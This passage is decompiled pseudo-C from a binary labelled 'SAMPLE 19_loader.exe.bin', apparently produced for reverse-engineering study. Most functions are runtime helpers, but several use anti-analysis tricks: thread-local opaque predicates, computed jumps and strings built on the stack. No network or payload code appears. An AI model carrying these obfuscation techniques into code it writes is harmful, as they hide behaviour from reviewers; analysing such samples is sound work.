    pcVar5 = (code *)invalidInstructionException();
    (*pcVar5)();
  }
  *puStack_58 = uVar13;
  local_60 = puStack_58;
  puStack_58 = local_50;
  local_50 = (ushort *)0x1;
  pbVar7 = (byte *)param_2[1];
  uVar13 = *(ushort *)((longlong)param_2 + 0x1a);
  uVar10 = (uint)*(ushort *)(param_2 + 2);
  local_48 = param_1;
  do {
    puVar6 = local_50;
    if (pbVar16 == (byte *)0x0) {
LAB_1400090fe:
      if ((uVar17 & 0xfffd) == 0) {
        local_48[2] = (longlong)local_50;
        *local_48 = (longlong)local_60;
        local_48[1] = (longlong)puStack_58;
        return;
      }
      pbVar16 = (byte *)0x0;
      lVar15 = 0;
      uVar17 = 0;
      uVar18 = uVar13;
      if (local_50 == puStack_58) goto LAB_140009169;
    }
    else {
      uVar18 = (ushort)uVar10;
      if (uVar18 == 0) {
        if (pbVar7 == pbVar16) goto LAB_1400090fe;
        bVar2 = *pbVar16;
        uVar10 = (uint)bVar2;
        if ((char)bVar2 < '\0') {
          uVar9 = bVar2 & 0x1f;
          pbVar1 = pbVar16 + 1;
          if (bVar2 < 0xe0) {
            pbVar16 = pbVar16 + 2;
            uVar10 = uVar9 << 6 | *pbVar1 & 0x3f;
          }
          else {
            uVar10 = pbVar16[2] & 0x3f | (*pbVar1 & 0x3f) << 6;
            if (bVar2 < 0xf0) {
              pbVar16 = pbVar16 + 3;
              uVar10 = uVar10 | uVar9 << 0xc;
            }
            else {
              pbVar1 = pbVar16 + 3;
              pbVar16 = pbVar16 + 4;
              uVar10 = *pbVar1 & 0x3f | uVar10 << 6 | (bVar2 & 7) << 0x12;
            }
            if (0xffff < uVar10) {
              uVar18 = (short)(uVar10 >> 10) + 0x3fc0U | 0xd800;
              uVar10 = uVar10 & 0x3ff | 0xdc00;
              goto LAB_14000914c;
            }
          }
        }
        else {
          pbVar16 = pbVar16 + 1;
        }
        uVar18 = (ushort)uVar10;
        uVar10 = 0;
      }
      else {
        uVar10 = 0;
      }
LAB_14000914c:
      if (local_50 == puStack_58) {
        uVar14 = (ulonglong)((short)uVar10 != 0);
        uVar12 = (longlong)pbVar7 - (longlong)pbVar16;
        auVar4._8_8_ = 0;
        auVar4._0_8_ = uVar12;
        uVar12 = uVar12 / 3;
        uVar11 = (ulonglong)(0x5555555555555555 < SUB168(auVar4 * ZEXT816(0xaaaaaaaaaaaaaaab),0));
        if ((short)uVar17 == 2) {
          lVar15 = uVar14 + uVar11 + uVar12;
          uVar17 = 2;
        }
        else {
          lVar15 = uVar11 + uVar17 + uVar12 + uVar14;
        }
LAB_140009169:
        lVar15 = FUN_140013790(&local_60,(ulonglong)local_50,lVar15 + 1,(LPVOID)0x2,2);
        if (lVar15 != -1) goto LAB_1400091a3;
        puVar8 = local_60;
      }
      else {
      }
    }
    puVar8[(longlong)puVar6] = uVar18;
    local_50 = (ushort *)((longlong)puVar6 + 1);
  } while( true );
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x9338 | partial_markers_remain ===== */
/* address=140009338 rva=0x9338 */

void FUN_140009338(void)

{
  LPVOID pvVar1;
  int *piVar2;
  
  FUN_140011d10();
  pvVar1 = FUN_14000fc7a(8,0x1e6);
  piVar2 = &DAT_14008ae3c;
  if (pvVar1 == (LPVOID)0x0) {
    piVar2 = &DAT_14008aa60;
  }
                    /* WARNING: Could not recover jumptable at 0x00014000955e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)(&LAB_140009db3 + *piVar2))();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0xfc7a | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

LPVOID FUN_14000fc7a(DWORD param_1,SIZE_T param_2)

{
  HANDLE hHeap;
  LPVOID pvVar1;
  
  hHeap = GetProcessHeap();
  if (hHeap == (HANDLE)0x0) {
    return (LPVOID)0x0;
  }
  pvVar1 = HeapAlloc(hHeap,param_1,param_2);
  return pvVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0xfcae | no_partial_markers_not_a_CFG_proof ===== */
/* address=14000fcae rva=0xfcae */

ulonglong FUN_14000fcae(uint *param_1,ushort *param_2)

{
  undefined8 uVar1;
  bool bVar2;
  char cVar3;
  uint uVar4;
  longlong lVar5;
  undefined8 uVar6;
  ushort uVar7;
  int iVar8;
  ushort uVar9;
  longlong lVar10;
  uint uVar11;
  uint uVar12;
  ulonglong uVar13;
  undefined7 uVar14;
  ulonglong uVar15;
  undefined1 *puVar16;
  undefined1 uStack_5f;
  undefined2 uStack_5e;
  undefined1 auStack_5b [11];
  undefined8 local_50;
  undefined4 local_48;
  
  uVar4 = *param_1;
  uVar12 = -uVar4;
  if ((int)-uVar4 < 0) {
    uVar12 = uVar4;
  }
  lVar5 = 10;
  if (uVar12 < 1000) {
    uVar11 = uVar12;
  }
  else {
    do {
      uVar11 = uVar12 / 10000;
      *(undefined2 *)(auStack_5b + lVar5 + -3) =
           *(undefined2 *)(&DAT_140088b14 + (ulonglong)((uVar12 % 10000) / 100) * 2);
      *(undefined2 *)(auStack_5b + lVar5 + -1) =
           *(undefined2 *)(&DAT_140088b14 + (ulonglong)((uVar12 % 10000) % 100) * 2);
      lVar5 = lVar5 + -4;
      bVar2 = 9999999 < uVar12;
      uVar12 = uVar12 / 10000;
    } while (bVar2);
  }
  uVar12 = uVar11;
  if (9 < uVar11) {
    uVar12 = (uVar11 & 0xffff) / 100;
    *(undefined2 *)(auStack_5b + lVar5 + -1) =
         *(undefined2 *)(&DAT_140088b14 + (ulonglong)(uVar11 + uVar12 * -100 & 0xffff) * 2);
    lVar5 = lVar5 + -2;
  }
  if ((uVar4 == 0) || (uVar12 != 0)) {
    auStack_5b[lVar5] = (&DAT_140088b15)[(ulonglong)(uVar12 & 0xf) * 2];
    lVar5 = lVar5 + -1;
  }
  lVar10 = 10 - lVar5;
  if ((int)uVar4 < 0) {
    uVar13 = 0xb - lVar5;
    uVar4 = *(uint *)(param_2 + 2);
    uVar12 = 0x2d;
  }
  else {
    uVar4 = *(uint *)(param_2 + 2);
    uVar12 = -(uint)((uVar4 & 0x200000) == 0) | 0x2b;
    uVar13 = (ulonglong)((uVar4 & 0x200000) >> 0x15) + lVar10;
  }
  uVar15 = (ulonglong)(uVar4 >> 0x17 & 1);
  puVar16 = auStack_5b + lVar5 + 1;
  uVar7 = *param_2;
  uVar14 = (undefined7)(uVar13 >> 8);
  if (uVar13 < uVar7) {
    if ((uVar4 >> 0x18 & 1) == 0) {
      uVar7 = uVar7 - (short)uVar13;
      uVar13 = CONCAT71(uVar14,1);
      uVar4 = FUN_14001309d((longlong)param_2,uVar7,'\x01');
      if (uVar4 != 0xffffffff) {
        uVar1 = *(undefined8 *)(param_2 + 8);
        lVar5 = *(longlong *)(param_2 + 0xc);
        uVar6 = FUN_140011fe8(uVar1,lVar5,uVar12,uVar15);
        if (((char)uVar6 == '\0') &&
           (cVar3 = (**(code **)(lVar5 + 0x18))(uVar1,puVar16,lVar10), cVar3 == '\0')) {
          uVar9 = 0xffff;
          do {
            if ((ushort)(uVar9 - uVar7) == -1) {
              uVar9 = uVar7;
              break;
            }
            cVar3 = (**(code **)(lVar5 + 0x20))(uVar1,uVar4);
            uVar9 = uVar9 + 1;
          } while (cVar3 == '\0');
          uVar13 = CONCAT71(uVar14,uVar9 < uVar7);
        }
      }
    }
    else {
      local_48 = *(undefined4 *)(param_2 + 4);
      local_50 = *(undefined8 *)param_2;
      *(uint *)(param_2 + 2) = uVar4 & 0x9fe00000 | 0x20000030;
      uVar1 = *(undefined8 *)(param_2 + 8);
      lVar5 = *(longlong *)(param_2 + 0xc);
      uVar6 = FUN_140011fe8(uVar1,lVar5,uVar12,uVar15);
      if ((char)uVar6 == '\0') {
        iVar8 = (uint)uVar7 - (int)uVar13;
        uVar4 = FUN_14001309d((longlong)param_2,(ushort)iVar8,'\x01');
        if ((uVar4 != 0xffffffff) &&
           (cVar3 = (**(code **)(lVar5 + 0x18))(uVar1,puVar16,lVar10), cVar3 == '\0')) {
          uVar12 = iVar8 + 1;
          do {
            uVar7 = (short)uVar12 - 1;
            uVar12 = (uint)uVar7;
            if (uVar7 == 0) {
              *(undefined4 *)(param_2 + 4) = local_48;
              *(undefined8 *)param_2 = local_50;
              uVar13 = 0;
              goto LAB_14000ff17;
            }
            cVar3 = (**(code **)(lVar5 + 0x20))(uVar1,uVar4);
          } while (cVar3 == '\0');
        }
      }
      uVar13 = CONCAT71(uVar14,1);
    }
  }
  else {
    uVar1 = *(undefined8 *)(param_2 + 8);
    lVar5 = *(longlong *)(param_2 + 0xc);
    uVar6 = FUN_140011fe8(uVar1,lVar5,uVar12,uVar15);
    uVar13 = CONCAT71(uVar14,1);
    if ((char)uVar6 == '\0') {
      uVar4 = (**(code **)(lVar5 + 0x18))(uVar1,puVar16,lVar10);
      uVar13 = (ulonglong)uVar4;
    }
  }
LAB_14000ff17:
  return uVar13 & 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0xff70 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14000ff70 rva=0xff70 */

void FUN_14000ff70(int param_1,undefined8 param_2,int param_3,HMODULE param_4)

{
  undefined8 uVar1;
  HMODULE pHVar2;
  void *pvVar3;
  
  uVar1 = *(undefined8 *)
           (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0xe8);
  pvVar3 = ThreadLocalStoragePointer;
  pHVar2 = (HMODULE)FUN_14000130d();
  FUN_140004251(((int)uVar1 + -0x1fb56213) * param_1 + param_3,pHVar2,param_4,(ulonglong)pvVar3);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0xffb7 | no_partial_markers_not_a_CFG_proof ===== */
/* address=14000ffb7 rva=0xffb7 */

undefined8 FUN_14000ffb7(HANDLE param_1,longlong *param_2)

{
  longlong lVar1;
  code *pcVar2;
  char cVar3;
  char cVar4;
  ulonglong uVar5;
  undefined8 *puVar6;
  uint uVar7;
  undefined8 *puVar8;
  undefined8 local_68;
  undefined8 uStack_60;
  undefined8 local_58;
  undefined8 uStack_50;
  
  local_58 = 0;
  uStack_50 = 0;
  local_68 = 0;
  uStack_60 = 0;
LAB_14000fff1:
  puVar6 = &local_68;
  uVar5 = FUN_140010243(param_1,&local_68,0x20);
  if ((uVar5 & 1) == 0) {
    puVar8 = puVar6;
    if ((undefined8 *)0x20 < puVar6) {
                    /* WARNING: Does not return */
      pcVar2 = (code *)invalidInstructionException();
      (*pcVar2)();
    }
LAB_1400100d7:
    FUN_1400125b9(param_2,(ulonglong)puVar8);
    lVar1 = param_2[2];
    if (puVar8 != (undefined8 *)0x0) {
      FUN_140021f30((undefined8 *)(*param_2 + lVar1),&local_68,(ulonglong)puVar8);
    }
    param_2[2] = lVar1 + (longlong)puVar8;
    return 0;
  }
  uVar7 = (uint)puVar6 & 3;
  cVar3 = (char)((ulonglong)puVar6 >> 0x20);
  switch(uVar7) {
  case 0:
    cVar4 = *(char *)(puVar6 + 2);
    break;
  case 1:
    cVar4 = *(char *)((longlong)puVar6 - 1);
    break;
  case 2:
    cVar4 = (**(code **)PTR_PTR_1400dfa90)((ulonglong)puVar6 >> 0x20);
    break;
  case 3:
    cVar4 = cVar3;
  }
  if (cVar4 == '\v') {
    puVar8 = (undefined8 *)0x0;
    if ((1 < uVar7 - 2) && (((ulonglong)puVar6 & 3) != 0)) {
      (**(code **)((longlong)puVar6 + 7))((longlong)puVar6 - 1);
      puVar8 = (undefined8 *)0x0;
    }
    goto LAB_1400100d7;
  }
  switch(uVar7) {
  case 0:
    cVar3 = *(char *)(puVar6 + 2);
    break;
  case 1:
    if (*(char *)((longlong)puVar6 - 1) != '#') {
      return 1;
    }
    (**(code **)((longlong)puVar6 + 7))((longlong)puVar6 - 1);
    goto LAB_14000fff1;
  case 2:
    goto switchD_1400100b8_caseD_2;
  case 3:
    if ((undefined8 *)0x2bffffffff < puVar6) {
      cVar3 = -1;
    }
  }
  if (cVar3 != '#') {
    return 1;
  }
  goto LAB_14000fff1;
switchD_1400100b8_caseD_2:
  cVar3 = (**(code **)(PTR_PTR_1400dfa90 + 8))((ulonglong)puVar6 >> 0x20);
  if (cVar3 == '\0') {
    return 1;
  }
  goto LAB_14000fff1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1010c | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

void FUN_14001010c(undefined8 *param_1,ulonglong param_2)

{
  undefined1 uVar1;
  longlong lVar2;
  ulonglong uVar3;
  undefined4 *puVar4;
  longlong lVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  undefined1 uStack_69;
  undefined8 local_68;
  undefined8 uStack_60;
  undefined1 auStack_5c [4];
  undefined1 local_58 [8];
  undefined8 uStack_50;
  undefined4 local_48;
  undefined4 uStack_44;
  undefined8 uStack_40;
  undefined8 uStack_38;
  undefined8 uStack_30;
  
  lVar2 = *(longlong *)
           (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0x70);
  lVar5 = -0xd886c6d52e2ae72 - lVar2;
  uVar6 = (ulonglong)((uint)lVar2 ^ 0x2dd2d55d);
  *(undefined8 *)(auStack_5c + (uVar6 - 0xc)) = 0;
  *(undefined8 *)(auStack_5c + (uVar6 - 4)) = 0;
  *(undefined8 *)(auStack_5c + uVar6) = 0;
  *(undefined8 *)(local_58 + uVar6 + 4) = 0;
  local_58 = (undefined1  [8])0x7877767574737271;
  uStack_50 = 0x3534333231307a79;
  local_68 = 0x6867666564636261;
  uStack_60 = 0x706f6e6d6c6b6a69;
  local_48 = 0x39383736;
  uVar6 = uVar6 + 0xe7037ed1a0b428b7 ^ param_2;
  uVar7 = 0x24;
  do {
    uVar6 = uVar6 + lVar5;
    uVar3 = (uVar6 >> (0x33U - (char)lVar5 & 0x3f) ^ uVar6) * -0x40a7b892e31b1a47;
    uVar3 = (uVar3 >> 0x1b ^ uVar3) * -0x6b2fb644ecceee15;
    uVar3 = (uVar3 >> 0x1f ^ uVar3) % uVar7;
    uVar1 = auStack_5c[uVar7 - 0xd];
    auStack_5c[uVar7 - 0xd] = auStack_5c[uVar3 - 0xc];
    auStack_5c[uVar3 - 0xc] = uVar1;
    puVar4 = &UNK_14008affc;
    if (uVar7 != 2) {
      puVar4 = &UNK_14008b000;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar4) {
    case 0:
      param_1[6] = uStack_38;
      param_1[7] = uStack_30;
      param_1[4] = CONCAT44(uStack_44,local_48);
      param_1[5] = uStack_40;
      param_1[2] = local_58;
      param_1[3] = uStack_50;
      *param_1 = local_68;
      param_1[1] = uStack_60;
      return;
    case 0xfffffffb:
      uVar7 = uVar7 - 1;
    }
  } while( true );
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x10243 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140010243 rva=0x10243 */

undefined8 FUN_140010243(HANDLE param_1,undefined8 param_2,ulonglong param_3)

{
  code *pcVar1;
  uint uVar2;
  ulonglong uVar3;
  undefined8 uVar4;
  undefined8 local_18;
  undefined8 uStack_10;
  
  local_18 = 0x103;
  uStack_10 = 0;
  uVar3 = 0xffffffff;
  if (param_3 < 0xffffffff) {
    uVar3 = param_3;
  }
  uVar2 = NtReadFile(param_1,0,0,0,&local_18,param_2,(int)uVar3,0,0);
  if (uVar2 == 0x103) {
    WaitForSingleObject(param_1,0xffffffff);
    uVar2 = (uint)local_18;
  }
  uVar4 = 0;
  if (uVar2 != 0xc0000011) {
    if (uVar2 != 0xc000014b) {
      if (uVar2 == 0x103) {
        pcVar1 = (code *)swi(0x29);
        (*pcVar1)(7,0);
                    /* WARNING: Does not return */
        pcVar1 = (code *)invalidInstructionException();
        (*pcVar1)();
      }
      uVar2 = FUN_14000246e(uVar2);
      if ((char)uVar2 == '\0') {
        return 0;
      }
    }
    uVar4 = 1;
  }
  return uVar4;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x10303 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140010303 rva=0x10303 */

void FUN_140010303(undefined8 *param_1)

{
  code *pcVar1;
  longlong lVar2;
  
  lVar2 = FUN_140013790(param_1,param_1[1],1,(LPVOID)0x8,0x10);
  if (lVar2 != -1) {
                    /* WARNING: Does not return */
    pcVar1 = (code *)invalidInstructionException();
    (*pcVar1)();
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x10332 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140010332 rva=0x10332 */

/* WARNING: Type propagation algorithm not settling */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ulonglong FUN_140010332(undefined8 *param_1)

{
  longlong lVar1;
  char cVar2;
  byte bVar3;
  uint uVar4;
  DWORD DVar5;
  BOOL BVar6;
  UINT UVar7;
  longlong lVar8;
  HANDLE pvVar9;
  ulonglong uVar10;
  longlong lVar11;
  byte *pbVar12;
  code *pcVar13;
  ulonglong uVar14;
  undefined **ppuVar15;
  undefined **ppuVar16;
  undefined **ppuVar17;
  bool bVar18;
  char local_71;
  DWORD local_70 [2];
  undefined **local_68;
  undefined **local_60;
  char local_58 [8];
  undefined **local_50;
  undefined **local_48;
  
  cVar2 = *(char *)*param_1;
  *(char *)*param_1 = '\0';
  if (cVar2 == '\0') {
LAB_140010809:
                    /* WARNING: Does not return */
    pcVar13 = (code *)invalidInstructionException();
    (*pcVar13)();
  }
  local_71 = '\0';
  uVar14 = (ulonglong)DAT_1400defb0;
  if (DAT_1400defb0 != 0) {
    uVar14 = FUN_140022ca6(&local_71);
  }
  if (local_71 == '\0') {
    lVar1 = *(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8);
    lVar11 = *(longlong *)(lVar1 + 0x38);
    if (lVar11 == 0) {
      lVar8 = DAT_1400e0700;
      do {
        if (lVar8 == -1) goto LAB_140010809;
        lVar11 = lVar8 + 1;
        LOCK();
        bVar18 = lVar8 == DAT_1400e0700;
        if (bVar18) {
          DAT_1400e0700 = lVar11;
        }
        else {
          lVar8 = DAT_1400e0700;
        }
        UNLOCK();
      } while (!bVar18);
      *(longlong *)(lVar1 + 0x38) = lVar11;
    }
    if (lVar11 == DAT_1400def60) {
      if (DAT_1400def68 == 0xffffffff) {
        return 0xffffffff;
      }
      DAT_1400def68 = DAT_1400def68 + 1;
    }
    else {
      uVar14 = 0;
      LOCK();
      bVar18 = DAT_1400def58 == 0;
      if (bVar18) {
        DAT_1400def58 = 1;
      }
      else {
        uVar14 = (ulonglong)DAT_1400def58;
      }
      UNLOCK();
      if (!bVar18) {
        return uVar14;
      }
      DAT_1400def68 = 1;
      DAT_1400def60 = lVar11;
    }
    if (DAT_1400def70 != 0) goto LAB_140010809;
    DAT_1400def70 = -1;
    if (DAT_1400def78 == '\0') {
      pbVar12 = (byte *)0x0;
      pcVar13 = GetStdHandle_exref;
LAB_14001044a:
      do {
        while( true ) {
          ppuVar17 = (undefined **)
                     ((byte *)CONCAT35(DAT_1400def90._5_3_,(undefined5)DAT_1400def90) +
                     -(longlong)pbVar12);
          if ((byte *)CONCAT35(DAT_1400def90._5_3_,(undefined5)DAT_1400def90) < pbVar12 ||
              ppuVar17 == (undefined **)0x0) {
            ppuVar16 = (undefined **)0x0;
            goto LAB_140010676;
          }
          DAT_1400def78 = '\x01';
          ppuVar16 = (undefined **)((longlong)DAT_1400def80 + (longlong)pbVar12);
          if (DAT_1400defa0 == 2) break;
          if ((DAT_1400defa0 & 1) == 0) {
LAB_1400107b4:
            uVar14 = FUN_140011f41(DAT_1400defa8,ppuVar16,(ulonglong)ppuVar17);
          }
          else {
LAB_1400107d2:
            pvVar9 = DAT_1400defa8;
            if ((ulonglong)(uRam00000001400def99 >> 0x18) == 0) {
              ppuVar15 = ppuVar17;
              if ((undefined **)0xfff < ppuVar17) {
                ppuVar15 = (undefined **)0x1000;
              }
              FUN_140012db7((undefined8 *)local_58,(longlong)ppuVar16,(ulonglong)ppuVar15);
              if (local_58[0] == '\0') {
                ppuVar16 = local_50;
                ppuVar15 = local_48;
              }
              else {
                if (local_50 == (undefined **)0x0) {
                  bVar3 = *(byte *)ppuVar16;
                  uVar14 = 1;
                  if (0x32 < (byte)(bVar3 + 0x3e)) goto LAB_1400107fd;
                  ppuVar16 = (undefined **)&DAT_140088768;
                  if (ppuVar17 < (undefined **)(ulonglong)(byte)(&DAT_140088e9a)[bVar3]) {
                    ram0x0001400def95 = CONCAT13(bVar3,DAT_1400def90._5_3_);
                    uRam00000001400def99 = CONCAT13(1,(undefined3)uRam00000001400def99);
                    uVar14 = 0;
                    ppuVar16 = (undefined **)0x1;
                  }
                  goto LAB_14001057f;
                }
                if (ppuVar17 < local_50) goto LAB_140010809;
                FUN_140012db7((undefined8 *)local_70,(longlong)ppuVar16,(ulonglong)local_50);
                if ((char)local_70[0] != '\0') goto LAB_140010809;
                ppuVar16 = local_68;
                ppuVar15 = local_60;
              }
              uVar14 = FUN_140008e0f(pvVar9,(LPCSTR)ppuVar16,(ulonglong)ppuVar15);
            }
            else {
              if (3 < (byte)(uRam00000001400def99 >> 0x18)) goto LAB_140010809;
              if ((char)*(byte *)ppuVar16 < -0x40) {
                (&DAT_1400def98)[uRam00000001400def99 >> 0x18] = *(byte *)ppuVar16;
                bVar3 = DAT_1400def9c + 1;
                uRam00000001400def99 = CONCAT13(bVar3,(undefined3)uRam00000001400def99);
                ppuVar15 = (undefined **)
                           (ulonglong)(byte)(&DAT_140088e9a)[ram0x0001400def95 >> 0x18];
                if (bVar3 < (byte)(&DAT_140088e9a)[ram0x0001400def95 >> 0x18]) {
LAB_1400108b3:
                  ppuVar16 = (undefined **)0x1;
                  uVar14 = 0;
                }
                else {
                  if (4 < bVar3) goto LAB_140010809;
                  FUN_140012db7((undefined8 *)local_70,0x1400def98,(ulonglong)bVar3);
                  uRam00000001400def99 = uRam00000001400def99 & 0xffffff;
                  uVar14 = 1;
                  if ((char)local_70[0] == '\0') {
                    if (local_60 != ppuVar15) goto LAB_140010809;
                    ppuVar16 = local_68;
                    uVar10 = FUN_140008e0f(pvVar9,(LPCSTR)local_68,(ulonglong)ppuVar15);
                    if ((uVar10 & 1) == 0) {
                      if (ppuVar15 == ppuVar16) goto LAB_1400108b3;
                      goto LAB_140010809;
                    }
                  }
                  else {
                    ppuVar16 = (undefined **)&DAT_140088768;
                  }
                }
                pcVar13 = GetStdHandle_exref;
              }
              else {
                uRam00000001400def99 = uRam00000001400def99 & 0xffffff;
LAB_1400107fd:
                uVar14 = 1;
                ppuVar16 = (undefined **)&DAT_140088768;
              }
            }
          }
LAB_14001057f:
          if ((uVar14 & 1) != 0) goto LAB_140010585;
LAB_140010600:
          DAT_1400def78 = '\0';
          if (ppuVar16 == (undefined **)0x0) {
            ppuVar16 = &PTR_s_one_try_even_again_most_were_in_s_140088750;
            goto LAB_140010676;
          }
          pbVar12 = pbVar12 + (longlong)ppuVar16;
        }
        pvVar9 = (HANDLE)(*pcVar13)(0xfffffff5);
        if (pvVar9 == (HANDLE)0xffffffffffffffff) {
          DVar5 = GetLastError();
          if ((undefined **)PTR_PTR_1400dfa90 != &PTR_LAB_1400886d0) {
            PTR_PTR_1400dfa90 = (undefined *)&PTR_LAB_1400886d0;
          }
          ppuVar16 = (undefined **)((ulonglong)DVar5 << 0x20 | 2);
        }
        else {
          if (pvVar9 != (HANDLE)0x0) {
            local_70[0] = 0;
            BVar6 = GetConsoleMode(pvVar9,local_70);
            if ((BVar6 == 0) || (UVar7 = GetConsoleOutputCP(), UVar7 == 0xfde9)) {
              DAT_1400defa0 = 0;
              DAT_1400defa8 = pvVar9;
              goto LAB_1400107b4;
            }
            DAT_1400defa0 = 1;
            DAT_1400defa8 = pvVar9;
            goto LAB_1400107d2;
          }
          ppuVar16 = (undefined **)0x600000002;
          if ((undefined **)PTR_PTR_1400dfa90 != &PTR_LAB_1400886d0) {
            PTR_PTR_1400dfa90 = (undefined *)&PTR_LAB_1400886d0;
          }
        }
LAB_140010585:
        uVar4 = (uint)ppuVar16 & 3;
        DAT_1400def78 = '\0';
        switch(uVar4) {
        case 0:
          bVar3 = *(byte *)(ppuVar16 + 2);
joined_r0x0001400105b5:
          DAT_1400def78 = '\0';
          if (bVar3 != 0x23) goto LAB_140010676;
          goto LAB_14001044a;
        case 1:
          if (*(byte *)((longlong)ppuVar16 + -1) != 0x23) goto LAB_140010676;
          (**(code **)((longlong)ppuVar16 + 7))((byte *)((longlong)ppuVar16 + -1));
          goto LAB_14001044a;
        }
        if (uVar4 != 2) {
          bVar3 = (byte)((ulonglong)ppuVar16 >> 0x20);
          if ((undefined **)0x2bffffffff < ppuVar16) {
            bVar3 = 0xff;
          }
          goto joined_r0x0001400105b5;
        }
        if ((int)((ulonglong)ppuVar16 >> 0x20) == 6) {
          ppuVar16 = ppuVar17;
          goto LAB_140010600;
        }
        DAT_1400def78 = '\0';
        cVar2 = (**(code **)(PTR_PTR_1400dfa90 + 8))((ulonglong)ppuVar16 >> 0x20);
      } while (cVar2 != '\0');
LAB_140010676:
      if (pbVar12 != (byte *)0x0) {
        uVar14 = (longlong)CONCAT35(DAT_1400def90._5_3_,(undefined5)DAT_1400def90) -
                 (longlong)pbVar12;
        if ((byte *)CONCAT35(DAT_1400def90._5_3_,(undefined5)DAT_1400def90) < pbVar12)
        goto LAB_140010809;
        FUN_140021f30(DAT_1400def80,(undefined8 *)(pbVar12 + (longlong)DAT_1400def80),uVar14);
        if (uVar14 <= CONCAT35(DAT_1400def90._5_3_,(undefined5)DAT_1400def90)) {
          DAT_1400def90._0_5_ = (undefined5)uVar14;
          DAT_1400def90._5_3_ = (undefined3)(uVar14 >> 0x28);
        }
      }
      if (((ppuVar16 != (undefined **)0x0) && (1 < ((uint)ppuVar16 & 3) - 2)) &&
         (((ulonglong)ppuVar16 & 3) != 0)) {
        (**(code **)((longlong)ppuVar16 + 7))((byte *)((longlong)ppuVar16 + -1));
      }
    }
    uVar14 = FUN_140001280(DAT_1400def80,DAT_1400def88,1,1);
    bVar3 = DAT_1400def58;
    DAT_1400def78 = '\0';
    DAT_1400def80 = (undefined8 *)0x1;
    DAT_1400def88 = 0;
    DAT_1400def90._0_5_ = 0;
    ram0x0001400def95 = 0;
    uRam00000001400def99 = 0;
    DAT_1400defa0 = 2;
    DAT_1400def70 = DAT_1400def70 + 1;
    DAT_1400def68 = DAT_1400def68 - 1;
    if (DAT_1400def68 == 0) {
      DAT_1400def60 = 0;
      LOCK();
      DAT_1400def58 = 0;
      uVar14 = (ulonglong)bVar3;
      UNLOCK();
      if (bVar3 == 2) {
        uVar14 = WakeByAddressSingle(&DAT_1400def58);
      }
    }
  }
  return uVar14;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x108d1 | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

void FUN_1400108d1(void)

{
  undefined8 uVar1;
  code *pcVar2;
  undefined4 *puVar3;
  uint uVar4;
  LPVOID *local_60 [3];
  longlong lStack_48;
  LPVOID pvStack_38;
  longlong lStack_30;
  
  uVar1 = *(undefined8 *)
           (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0xa0);
  local_60[2] = FUN_14000fc7a(0,0x3b);
  puVar3 = &UNK_14008b1a4;
  if (local_60[2] == (LPVOID *)0x0) {
    puVar3 = &UNK_14008b1a0;
  }
                    /* WARNING: Switch is manually overridden */
  switch(*puVar3) {
  case 0:
                    /* WARNING: Does not return */
    pcVar2 = (code *)invalidInstructionException();
    (*pcVar2)();
  case 0xffffff4e:
    *(undefined8 *)((longlong)local_60[2] + 0x2b) = 0x20737361702d6565;
    *(undefined8 *)((longlong)local_60[2] + 0x33) = 0x676e69646f636e65;
    local_60[2][4] = (LPVOID)0x207373617020646e;
    local_60[2][5] = (LPVOID)0x61702d6565726874;
    local_60[2][2] = (LPVOID)0x746e6f6365746172;
    local_60[2][3] = (LPVOID)0x6f636573206c6f72;
    *local_60[2] = (LPVOID)0x6c616e7265746e69;
    local_60[2][1] = (LPVOID)0x20737361702d3220;
    lStack_48 = 0x3b;
    uVar4 = (uint)uVar1 ^ 0x2325f4fc;
    *(undefined8 *)((longlong)local_60 + (ulonglong)uVar4 + 0x10) = 0x3b;
    local_60[0] = (LPVOID *)0x140002152;
    *(LPVOID ***)((longlong)local_60 + (ulonglong)(uVar4 - 8)) = local_60 + 2;
    FUN_1400024d6(&pvStack_38,(ulonglong)local_60);
    DAT_1400e06f8 = 0;
    local_60[0] = &pvStack_38;
    FUN_140001280(pvStack_38,lStack_30,1,1);
    FUN_140001280(local_60[2],lStack_48,1,1);
    return;
  }
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x10a2f | partial_markers_remain ===== */
/* address=140010a2f rva=0x10a2f */

undefined8 FUN_140010a2f(undefined8 param_1,longlong param_2,ulonglong param_3,ushort *param_4)

